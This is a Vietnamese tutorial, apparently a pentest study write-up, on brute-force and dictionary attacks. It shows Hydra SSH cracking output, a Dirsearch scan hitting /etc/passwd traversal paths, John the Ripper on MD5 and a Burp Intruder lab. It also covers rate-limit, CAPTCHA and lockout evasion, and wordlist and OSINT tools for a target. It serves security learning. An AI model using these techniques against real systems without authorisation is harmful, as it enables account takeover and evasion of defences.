# Brute-Force-Dictionary-Attacks
## 1. Giới thiệu về Brute Force và Dictionary Attacks

### 1.1 Định nghĩa và phân biệt

#### Brute Force Attack

- **Định nghĩa**: Phương pháp tấn công thử tất cả các khả năng có thể của mật khẩu/key một cách tuần tự.
- **Đặc điểm**:
  - Thử từng ký tự, từng tổ hợp có thể (a, b, c... aa, ab, ac...)
  - Đảm bảo 100% tìm được mật khẩu nhưng tốn rất nhiều thời gian.
- **Ví dụ**: Thử mật khẩu từ `000000` → `999999` cho mã PIN 6 số.

#### Dictionary Attack

- **Định nghĩa**: Sử dụng danh sách các mật khẩu phổ biến, thường dùng (wordlist).
- **Đặc điểm**:
  - Nhanh hơn brute force nhưng không đảm bảo 100% thành công.
  - Dựa trên thói quen tạo mật khẩu yếu của người dùng.
- **Ví dụ**: Thử các mật khẩu như `"123456"`, `"password"`, `"admin"`.

### 1.2 Mục tiêu và nguyên lý hoạt động

#### Mục tiêu

- Chiếm quyền truy cập hệ thống, tài khoản.
- Crack hash password đã thu thập được.
- Bypass authentication mechanisms.
- Tìm hidden directories/files trên web server.

#### Nguyên lý hoạt động

1. Thu thập thông tin target (username, login form...)
2. Chuẩn bị wordlist/pattern tấn công  
3. Gửi request login với từng password candidate  
4. Phân tích response để xác định thành công/thất bại  
5. Lặp lại cho đến khi tìm được credentials đúng

## 2. Phương pháp thực hiện tấn công

### 2.1 Sử dụng các công cụ brute-force

#### A. Hydra - Network Login Cracker

**Các lệnh cơ bản**:

```bash
# SSH brute force
hydra -l maianh -P wordlist.txt ssh://172.16.1.29

# Kết quả thành công
[22][ssh] host: 172.16.1.29   login: maianh   password: ubuntu
1 of 1 target successfully completed, 1 valid password found
```
<img width="938" height="235" alt="image" src="https://github.com/user-attachments/assets/9ddffcee-b1e5-49a5-9c63-7f952a167c86" />

#### B. Dirsearch - Web Directory Scanner
**Thời gian quét**: Bắt đầu lúc [03:42 PM +07, July 30, 2025], hoàn thành lúc [03:43 PM +07, July 30, 2025].
**Kết quả**: Đã phát hiện nhiều endpoint và tệp, bao gồm:
- /google.com (HTTP 302)
- /test (HTTP 200)
- /etc/passwd (HTTP 200)
- /admin/%3Bindex/ (HTTP 200)
- /axis2-web/HappyAxis.jsp (HTTP 200)
- /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd (HTTP 200)
- /Citrix/AccessPlatform/auth/clientscripts/cookies.js (HTTP 200)
- /engine/classes/swfupload/swfupload_f9.swf (HTTP 200)
- /jkstatus (HTTP 200)
- /login.wdm%2e (HTTP 200)
- Và nhiều thư mục/tệp khác
<img width="1448" height="697" alt="image" src="https://github.com/user-attachments/assets/5430f667-afe4-4fc2-906c-54766898874f" />

#### C. John the ripper

**Các lệnh cơ bản**:

```bash
# Tạo file md5.hash chứa hash MD5
echo "81d9d0b5d2d4dc2003d6db8313ed055" > md5.hash

# Hiển thị nội dung file md5.hash
cat md5.hash

# Sử dụng John the Ripper để crack hash MD5
sudo john --format=raw-md5 md5.hash

```
Ở đây ta sẽ bẻ khoá hàm băm md5. Hash dữ liệu “1234” với MD5
 <img width="940" height="228" alt="image" src="https://github.com/user-attachments/assets/8608a607-7b99-4c1e-bfd4-bc5688b18371" />

Thực hiện tạo 1 file là md5.hash để lưu dữ liệu vừa hash. 
Để thực hiển bẻ khóa mã hash MD5 trên với John the Ripper
<img width="940" height="326" alt="image" src="https://github.com/user-attachments/assets/70672851-abbf-4bc1-ac25-d8a28618e11a" />


### 2.2 Ứng dụng Burp Suite Intruder

#### A. Cấu hình Intruder Attack

**Bước 1**: Capture Request

- Intercept login request với Burp Proxy  
- Send to Intruder (Ctrl+I)

**Bước 2**: Position Setup

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§
```

- Đánh dấu parameter cần brute force với `§ §`
- Chọn Attack Type: Sniper, Battering Ram, Pitchfork, Cluster Bomb

**Bước 3**: Payload Configuration

- Simple List: Load wordlist từ file  
- Runtime File: Dynamic wordlist loading  
- Character Substitution: Thay thế ký tự (@ → a, 3 → e)  
- Case Modification: Uppercase/lowercase variants

#### B. Attack Types chi tiết

- **Sniper Attack**:
  - 1 payload set, 1 position  
  - Dùng cho brute-force một parameter duy nhất

- **Battering Ram**:
  - 1 payload set, nhiều vị trí  
  - Cùng một giá trị sẽ điền vào tất cả các vị trí

- **Pitchfork**:
  - Nhiều payload set, áp dụng tương ứng từng vị trí

- **Cluster Bomb**:
  - Nhiều payload set, thử tất cả tổ hợp (combinations)
#### Để nắm chi tiết, thực hiện một vài bài lab
**Lab: Username enumeration via different responses**
**Bước 1: Tìm đúng username**
- Mở Burp và truy cập trang login, nhập sai username + password.

- Trong Burp, vào Proxy > HTTP history, tìm request POST /login.

- Click phải vào phần username → chọn Send to Intruder.

- Trong tab Intruder, để chế độ Sniper, giữ nguyên password, chỉ đánh dấu username (§username§).

- Vào tab Payloads, dán danh sách các username cần thử và bấm Start attack.

- Khi kết thúc:

  - Xem cột Length → giá trị nào dài hơn có thể là username đúng.

  - So sánh response → nếu thấy "Incorrect password" thay vì "Invalid username" → bạn đã tìm ra username hợp lệ.
<img width="1861" height="960" alt="image" src="https://github.com/user-attachments/assets/91c07dfb-6b2a-46f6-9a98-df89b1f3d2d6" />
<img width="1808" height="890" alt="image" src="https://github.com/user-attachments/assets/4cdba024-d703-4033-b3db-13b571d6f7b4" />
- Từ hình trên ta thấy được username tìm được là "apache"
**Bước 2: Tìm đúng password**
- Quay lại Intruder, bấm Clear §.

- Sửa request thành: username=correct-user&password=§pass§.

- Trong tab Payloads, dán danh sách password cần thử và bấm Start attack.

- Khi kết thúc:

  - Xem cột Status: Nếu tất cả là 200, nhưng 1 dòng là 302 → đó là login thành công.
<img width="1806" height="844" alt="image" src="https://github.com/user-attachments/assets/04c44233-8517-42f8-9749-264a5ab052a9" />
> Ta thấy được username : apache và password : ginger
> <img width="1853" height="821" alt="image" src="https://github.com/user-attachments/assets/313995a9-1a76-4e69-bfad-86a86dfed1b9" />


### 2.3 Kỹ thuật bypass bảo vệ

#### A. Rate Limiting Bypass

**IP Rotation:**

```python
proxies = [
    'http://proxy1:8080',
    'http://proxy2:8080',
    'http://proxy3:8080'
]
```

**X-Forwarded-For Header Spoofing:**

```http
X-Forwarded-For: 192.168.1.100
X-Real-IP: 192.168.1.101
X-Originating-IP: 192.168.1.102
```

**User-Agent Rotation:**

```python
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0...)',
    'Mozilla/5.0 (Macintosh...)',
    'Mozilla/5.0 (Linux x86_64...)'
]
```

#### B. CAPTCHA Bypass

- Sử dụng OCR tools (ví dụ: Tesseract)  
- Dịch vụ giải CAPTCHA tự động: `2captcha`, `Anti-Captcha`  
- Phân tích pattern (với CAPTCHA đơn giản)  
- Reuse session để tránh bị CAPTCHA

#### C. Account Lockout Evasion

**Password Spraying Technique:**

```text
user1:password123
user2:password123
user3:password123

user1:admin123
user2:admin123
user3:admin123
```

**Timing Attacks:**

- Giãn thời gian giữa các lần thử  
- Tấn công từ nhiều IP (Distributed brute force)  
- Kỹ thuật “low-and-slow” để tránh detection

---

### 2.4 Wordlist và Dictionary Management

#### A. Wordlist phổ biến

| Wordlist              | Mô tả                                | Kích thước      |
|-----------------------|--------------------------------------|-----------------|
| rockyou.txt           | 14M passwords từ data breach         | ~133MB          |
| SecLists              | Bộ sưu tập wordlist dùng pentesting  | Rất đa dạng     |
| CIRT Default Passwords| Default credentials từ thiết bị      | ~1000 entries   |
| Custom wordlists      | Dựa trên thông tin từ target cụ thể  | Tùy thuộc       |

#### B. Wordlist Generation Tools

**Crunch:**

```bash
# Generate 4–6 character passwords
crunch 4 6 abcdefghijklmnopqrstuvwxyz

# Pattern-based generation
crunch 8 8 -t password@@

# Custom character set
crunch 8 8 -t @@@@@@## -f charset.lst mixalpha-numeric
```

**CeWL:**

```bash
# Extract từ website
cewl -d 2 -m 5 https://target.com

# Include email addresses và usernames
cewl -e -n https://target.com

# Output to file
cewl -w wordlist.txt -m 6 https://target.com
```

**Mentalist (GUI):**

- Giao diện đồ họa tạo wordlist  
- Cho phép rule-based transformation  
- Có thống kê & hỗ trợ biến thể tự động

---

#### C. Wordlist Optimization

```bash
# Remove duplicates and sort
sort wordlist.txt | uniq > clean_wordlist.txt

# Combine multiple lists
cat list1.txt list2.txt | sort | uniq > combined.txt

# Filter by password length
awk 'length($0) >= 8 && length($0) <= 12' wordlist.txt > filtered.txt

# Remove special characters
grep -v '[^a-zA-Z0-9]' wordlist.txt > clean.txt
```

**Statistical Analysis:**

```bash
# Word frequency
sort wordlist.txt | uniq -c | sort -nr

# Password length distribution
awk '{print length}' wordlist.txt | sort -n | uniq -c

# Character frequency
fold -w1 wordlist.txt | sort | uniq -c | sort -nr
```

#### D. Target-specific Wordlist Creation

**Thông tin thu thập được từ:**

- Tên công ty, sản phẩm, sự kiện, ngày thành lập  
- Tên nhân viên từ LinkedIn, Facebook  
- Các thuật ngữ kỹ thuật từ job description  

**Công cụ OSINT:**

```bash
# LinkedIn enumeration
python3 linkedin2username.py -c "Company Name"

# Google dorking
site:pastebin.com "Company Name" password

# Sherlock (search username across platforms)
python3 sherlock.py username
```

